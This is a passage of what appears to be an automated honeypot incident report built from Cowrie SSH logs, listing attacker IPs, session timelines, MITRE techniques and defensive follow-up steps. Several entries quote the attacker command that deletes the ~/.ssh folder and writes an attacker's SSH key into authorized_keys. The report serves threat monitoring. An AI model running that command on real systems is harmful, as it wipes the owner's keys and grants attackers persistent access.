| `2026-07-02 07:26:12` | `cowrie.client.version` |
| `2026-07-02 07:26:12` | `cowrie.client.kex` |
| `2026-07-02 07:26:12` | `cowrie.login.success` |
| `2026-07-02 07:26:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-695ed950bb03

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-02 07:27 |
| **Last Seen** | 2026-07-02 07:28 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 07:27:48` | `cowrie.session.connect` |
| `2026-07-02 07:27:49` | `cowrie.client.version` |
| `2026-07-02 07:27:49` | `cowrie.client.kex` |
| `2026-07-02 07:27:56` | `cowrie.login.success` |
| `2026-07-02 07:27:59` | `cowrie.session.params` |
| `2026-07-02 07:27:59` | `cowrie.command.input` |
| `2026-07-02 07:28:00` | `cowrie.log.closed` |
| `2026-07-02 07:28:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0f7bd738156b

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-07-02 07:31 |
| **Last Seen** | 2026-07-02 07:31 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 07:31:25` | `cowrie.session.connect` |
| `2026-07-02 07:31:26` | `cowrie.client.version` |
| `2026-07-02 07:31:26` | `cowrie.client.kex` |
| `2026-07-02 07:31:28` | `cowrie.login.success` |
| `2026-07-02 07:31:29` | `cowrie.session.params` |
| `2026-07-02 07:31:29` | `cowrie.command.input` |
| `2026-07-02 07:31:29` | `cowrie.log.closed` |
| `2026-07-02 07:31:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-694aa347ff66

| Field | Detail |
|---|---|
| **Source IP** | `186.68.83[.]104` |
| **First Seen** | 2026-07-02 07:32 |
| **Last Seen** | 2026-07-02 07:32 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 07:32:31` | `cowrie.session.connect` |
| `2026-07-02 07:32:31` | `cowrie.client.version` |
| `2026-07-02 07:32:32` | `cowrie.client.kex` |
| `2026-07-02 07:32:32` | `cowrie.login.success` |
| `2026-07-02 07:32:33` | `cowrie.session.params` |
| `2026-07-02 07:32:33` | `cowrie.command.input` |
| `2026-07-02 07:32:33` | `cowrie.command.failed` |
| `2026-07-02 07:32:33` | `cowrie.log.closed` |
| `2026-07-02 07:32:34` | `cowrie.session.params` |
| `2026-07-02 07:32:34` | `cowrie.command.input` |
| `2026-07-02 07:32:34` | `cowrie.session.file_download` |
| `2026-07-02 07:32:34` | `cowrie.log.closed` |
| `2026-07-02 07:32:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.68.83[.]104` to AbuseIPDB if not already reported
- [ ] Block `186.68.83[.]104` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bd183a0cb657

| Field | Detail |
|---|---|
| **Source IP** | `186.68.83[.]104` |
| **First Seen** | 2026-07-02 07:32 |
| **Last Seen** | 2026-07-02 07:32 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 07:32:34` | `cowrie.session.connect` |
| `2026-07-02 07:32:34` | `cowrie.client.version` |
| `2026-07-02 07:32:34` | `cowrie.client.kex` |
| `2026-07-02 07:32:34` | `cowrie.login.success` |
| `2026-07-02 07:32:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.68.83[.]104` to AbuseIPDB if not already reported
- [ ] Block `186.68.83[.]104` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-170ddd047e61

| Field | Detail |
|---|---|
| **Source IP** | `186.68.83[.]104` |
| **First Seen** | 2026-07-02 07:32 |
| **Last Seen** | 2026-07-02 07:32 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 07:32:34` | `cowrie.session.connect` |
| `2026-07-02 07:32:34` | `cowrie.client.version` |
| `2026-07-02 07:32:34` | `cowrie.client.kex` |
| `2026-07-02 07:32:35` | `cowrie.login.success` |
| `2026-07-02 07:32:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.68.83[.]104` to AbuseIPDB if not already reported
- [ ] Block `186.68.83[.]104` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9aa7de523708

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-02 07:39 |
| **Last Seen** | 2026-07-02 07:39 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 07:39:12` | `cowrie.session.connect` |
| `2026-07-02 07:39:13` | `cowrie.client.version` |
| `2026-07-02 07:39:13` | `cowrie.client.kex` |
| `2026-07-02 07:39:19` | `cowrie.login.success` |
| `2026-07-02 07:39:22` | `cowrie.session.params` |
| `2026-07-02 07:39:22` | `cowrie.command.input` |
| `2026-07-02 07:39:24` | `cowrie.log.closed` |
| `2026-07-02 07:39:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d6fbabb614e0

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-07-02 07:45 |
| **Last Seen** | 2026-07-02 07:45 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 07:45:26` | `cowrie.session.connect` |
| `2026-07-02 07:45:26` | `cowrie.client.version` |
| `2026-07-02 07:45:26` | `cowrie.client.kex` |
| `2026-07-02 07:45:27` | `cowrie.login.success` |
| `2026-07-02 07:45:28` | `cowrie.session.params` |
| `2026-07-02 07:45:28` | `cowrie.command.input` |
| `2026-07-02 07:45:29` | `cowrie.log.closed` |
| `2026-07-02 07:45:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fada18a34a50

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-02 07:50 |
| **Last Seen** | 2026-07-02 07:51 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 07:50:53` | `cowrie.session.connect` |
| `2026-07-02 07:50:55` | `cowrie.client.version` |
| `2026-07-02 07:50:55` | `cowrie.client.kex` |
| `2026-07-02 07:51:00` | `cowrie.login.success` |
| `2026-07-02 07:51:05` | `cowrie.session.params` |
| `2026-07-02 07:51:05` | `cowrie.command.input` |
| `2026-07-02 07:51:06` | `cowrie.log.closed` |
| `2026-07-02 07:51:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-655c4f33efa1

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-02 07:52 |
| **Last Seen** | 2026-07-02 07:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 07:52:53` | `cowrie.session.connect` |
| `2026-07-02 07:52:53` | `cowrie.client.version` |
| `2026-07-02 07:52:53` | `cowrie.client.kex` |
| `2026-07-02 07:52:54` | `cowrie.login.success` |
| `2026-07-02 07:52:54` | `cowrie.session.params` |
| `2026-07-02 07:52:54` | `cowrie.command.input` |
| `2026-07-02 07:52:54` | `cowrie.log.closed` |
| `2026-07-02 07:52:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5d3920e15f6e

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-07-02 07:59 |
| **Last Seen** | 2026-07-02 07:59 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 07:59:22` | `cowrie.session.connect` |
| `2026-07-02 07:59:22` | `cowrie.client.version` |
| `2026-07-02 07:59:22` | `cowrie.client.kex` |
| `2026-07-02 07:59:24` | `cowrie.login.success` |
| `2026-07-02 07:59:26` | `cowrie.session.params` |
| `2026-07-02 07:59:26` | `cowrie.command.input` |
| `2026-07-02 07:59:26` | `cowrie.log.closed` |
| `2026-07-02 07:59:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-716d3d467e55

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-02 08:02 |
| **Last Seen** | 2026-07-02 08:02 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 08:02:35` | `cowrie.session.connect` |
| `2026-07-02 08:02:36` | `cowrie.client.version` |
| `2026-07-02 08:02:36` | `cowrie.client.kex` |
| `2026-07-02 08:02:43` | `cowrie.login.success` |
| `2026-07-02 08:02:46` | `cowrie.session.params` |
| `2026-07-02 08:02:46` | `cowrie.command.input` |
| `2026-07-02 08:02:49` | `cowrie.log.closed` |
| `2026-07-02 08:02:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e2d6c16e1595

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-07-02 08:13 |
| **Last Seen** | 2026-07-02 08:13 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 08:13:19` | `cowrie.session.connect` |
| `2026-07-02 08:13:20` | `cowrie.client.version` |
| `2026-07-02 08:13:20` | `cowrie.client.kex` |
| `2026-07-02 08:13:21` | `cowrie.login.success` |
| `2026-07-02 08:13:22` | `cowrie.session.params` |
| `2026-07-02 08:13:22` | `cowrie.command.input` |
| `2026-07-02 08:13:22` | `cowrie.log.closed` |
| `2026-07-02 08:13:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-87d9b073f340

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-02 08:14 |
| **Last Seen** | 2026-07-02 08:14 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 08:14:05` | `cowrie.session.connect` |
| `2026-07-02 08:14:06` | `cowrie.client.version` |
| `2026-07-02 08:14:06` | `cowrie.client.kex` |
| `2026-07-02 08:14:12` | `cowrie.login.success` |
| `2026-07-02 08:14:15` | `cowrie.session.params` |
| `2026-07-02 08:14:15` | `cowrie.command.input` |
| `2026-07-02 08:14:16` | `cowrie.log.closed` |
| `2026-07-02 08:14:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-287935fc6bce

| Field | Detail |
|---|---|
| **Source IP** | `34.156.17[.]76` |
| **First Seen** | 2026-07-02 08:20 |
| **Last Seen** | 2026-07-02 08:20 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0[.]0 Safari/537.36, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 08:20:13` | `cowrie.session.connect` |
| `2026-07-02 08:20:13` | `cowrie.login.success` |
| `2026-07-02 08:20:14` | `cowrie.session.params` |
| `2026-07-02 08:20:14` | `cowrie.command.input` |
| `2026-07-02 08:20:14` | `cowrie.command.input` |
| `2026-07-02 08:20:14` | `cowrie.command.failed` |
| `2026-07-02 08:20:14` | `cowrie.command.input` |
| `2026-07-02 08:20:14` | `cowrie.log.closed` |
| `2026-07-02 08:20:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.156.17[.]76` to AbuseIPDB if not already reported
- [ ] Block `34.156.17[.]76` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7ca53c102b89

| Field | Detail |
|---|---|
| **Source IP** | `34.156.17[.]76` |
| **First Seen** | 2026-07-02 08:20 |
| **Last Seen** | 2026-07-02 08:20 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `PING` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 08:20:22` | `cowrie.session.connect` |
| `2026-07-02 08:20:22` | `cowrie.login.success` |
| `2026-07-02 08:20:22` | `cowrie.session.params` |
| `2026-07-02 08:20:22` | `cowrie.command.input` |
| `2026-07-02 08:20:22` | `cowrie.command.failed` |
| `2026-07-02 08:20:26` | `cowrie.log.closed` |
| `2026-07-02 08:20:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.156.17[.]76` to AbuseIPDB if not already reported
- [ ] Block `34.156.17[.]76` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6cf106f409c4

| Field | Detail |
|---|---|
| **Source IP** | `34.156.17[.]76` |
| **First Seen** | 2026-07-02 08:20 |
| **Last Seen** | 2026-07-02 08:20 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 08:20:24` | `cowrie.session.connect` |
| `2026-07-02 08:20:24` | `cowrie.login.success` |
| `2026-07-02 08:20:24` | `cowrie.session.params` |
| `2026-07-02 08:20:24` | `cowrie.command.input` |
| `2026-07-02 08:20:26` | `cowrie.log.closed` |
| `2026-07-02 08:20:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.156.17[.]76` to AbuseIPDB if not already reported
- [ ] Block `34.156.17[.]76` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f1708c4118b8

| Field | Detail |
|---|---|
| **Source IP** | `171.244.63[.]18` |
| **First Seen** | 2026-07-02 08:20 |
| **Last Seen** | 2026-07-02 08:20 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 08:20:39` | `cowrie.session.connect` |
| `2026-07-02 08:20:39` | `cowrie.client.version` |
| `2026-07-02 08:20:39` | `cowrie.client.kex` |
| `2026-07-02 08:20:40` | `cowrie.login.success` |
| `2026-07-02 08:20:41` | `cowrie.session.params` |
| `2026-07-02 08:20:41` | `cowrie.command.input` |
| `2026-07-02 08:20:41` | `cowrie.command.failed` |
| `2026-07-02 08:20:42` | `cowrie.log.closed` |
| `2026-07-02 08:20:42` | `cowrie.session.params` |
| `2026-07-02 08:20:42` | `cowrie.command.input` |
| `2026-07-02 08:20:43` | `cowrie.session.file_download` |
| `2026-07-02 08:20:43` | `cowrie.log.closed` |
| `2026-07-02 08:20:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.244.63[.]18` to AbuseIPDB if not already reported
- [ ] Block `171.244.63[.]18` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b047821aac77

| Field | Detail |
|---|---|
| **Source IP** | `171.244.63[.]18` |
| **First Seen** | 2026-07-02 08:20 |
| **Last Seen** | 2026-07-02 08:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 08:20:43` | `cowrie.session.connect` |
| `2026-07-02 08:20:43` | `cowrie.client.version` |
| `2026-07-02 08:20:43` | `cowrie.client.kex` |
| `2026-07-02 08:20:44` | `cowrie.login.success` |
| `2026-07-02 08:20:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.244.63[.]18` to AbuseIPDB if not already reported
- [ ] Block `171.244.63[.]18` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-931dadad2583

| Field | Detail |
|---|---|
| **Source IP** | `171.244.63[.]18` |
| **First Seen** | 2026-07-02 08:20 |
| **Last Seen** | 2026-07-02 08:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 08:20:44` | `cowrie.session.connect` |
| `2026-07-02 08:20:44` | `cowrie.client.version` |
| `2026-07-02 08:20:45` | `cowrie.client.kex` |
| `2026-07-02 08:20:46` | `cowrie.login.success` |
| `2026-07-02 08:20:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.244.63[.]18` to AbuseIPDB if not already reported
- [ ] Block `171.244.63[.]18` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7b12f60e5bf0

| Field | Detail |
|---|---|
| **Source IP** | `20.124.91[.]101` |
| **First Seen** | 2026-07-02 08:23 |
| **Last Seen** | 2026-07-02 08:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 08:23:34` | `cowrie.session.connect` |
| `2026-07-02 08:23:34` | `cowrie.client.version` |
| `2026-07-02 08:23:34` | `cowrie.client.kex` |
| `2026-07-02 08:23:34` | `cowrie.login.success` |
| `2026-07-02 08:23:35` | `cowrie.session.params` |
| `2026-07-02 08:23:35` | `cowrie.command.input` |
| `2026-07-02 08:23:35` | `cowrie.command.failed` |
| `2026-07-02 08:23:35` | `cowrie.log.closed` |
| `2026-07-02 08:23:36` | `cowrie.session.params` |
| `2026-07-02 08:23:36` | `cowrie.command.input` |
| `2026-07-02 08:23:36` | `cowrie.session.file_download` |
| `2026-07-02 08:23:36` | `cowrie.log.closed` |
| `2026-07-02 08:23:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.124.91[.]101` to AbuseIPDB if not already reported
- [ ] Block `20.124.91[.]101` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dfd6a95cedbe

| Field | Detail |
|---|---|
| **Source IP** | `20.124.91[.]101` |
| **First Seen** | 2026-07-02 08:23 |
| **Last Seen** | 2026-07-02 08:23 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 08:23:36` | `cowrie.session.connect` |
| `2026-07-02 08:23:36` | `cowrie.client.version` |
| `2026-07-02 08:23:36` | `cowrie.client.kex` |
| `2026-07-02 08:23:36` | `cowrie.login.success` |
| `2026-07-02 08:23:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.124.91[.]101` to AbuseIPDB if not already reported
- [ ] Block `20.124.91[.]101` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fa681cffbfac

| Field | Detail |
|---|---|
| **Source IP** | `20.124.91[.]101` |
| **First Seen** | 2026-07-02 08:23 |
| **Last Seen** | 2026-07-02 08:23 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 08:23:36` | `cowrie.session.connect` |
| `2026-07-02 08:23:36` | `cowrie.client.version` |
| `2026-07-02 08:23:36` | `cowrie.client.kex` |
| `2026-07-02 08:23:36` | `cowrie.login.success` |
| `2026-07-02 08:23:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.124.91[.]101` to AbuseIPDB if not already reported
- [ ] Block `20.124.91[.]101` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1ee2463b08df

| Field | Detail |
|---|---|
| **Source IP** | `103.190.214[.]241` |
| **First Seen** | 2026-07-02 08:24 |
| **Last Seen** | 2026-07-02 08:24 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
